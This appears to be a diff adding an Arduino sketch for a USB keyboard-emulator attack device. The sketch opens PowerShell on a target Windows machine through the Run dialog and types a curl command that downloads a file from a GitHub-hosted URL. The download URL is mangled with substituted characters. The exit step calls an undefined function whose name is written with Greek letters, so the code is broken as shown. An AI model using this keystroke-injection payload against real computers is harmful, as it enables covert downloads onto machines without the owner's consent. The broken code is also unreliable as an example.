@@ -1,1 +1,57 @@
 // this code will be used on an arduino keyboard emulator to download a file from the web onto the target windows device
+#include <Keyboard.h>
+
+
+void pscmd(String command)
+{
+  // type the command
+  delay(100);
+  Keyboard.print(command);
+  delay(100);
+  // hit enter
+  Keyboard.write(KEY_RETURN);
+}
+
+void openPS()
+{
+  // win+r to open the execute-window
+  Keyboard.press(KEY_RIGHT_GUI);
+  Keyboard.press(0x72);
+  delay(10);
+  Keyboard.releaseAll();
+
+  // type powershell and hit enter to open powershell
+  delay(500);
+  Keyboard.print("powershell");
+  
+  delay(150);
+  Keyboard.write(KEY_RETURN);
+}
+
+void setup() 
+{
+  delay(2000);
+  Keyboard.begin();
+  delay(1000);
+  
+  // open the powershell
+  openPS();
+  
+  // download file 
+  String download_cmd = "curl https>&&raw.githubusercontent.com&DerMart1n&duck&master&curl?this /OutFile curled.txt";
+  pscmd(download_cmd);
+  delay(2000);
+  
+  // close powershell
+  commandΤοPS("exit");
+  
+
+  delay(1000);
+  Keyboard.end();
+}
+
+
+void loop() 
+{
+  
+}
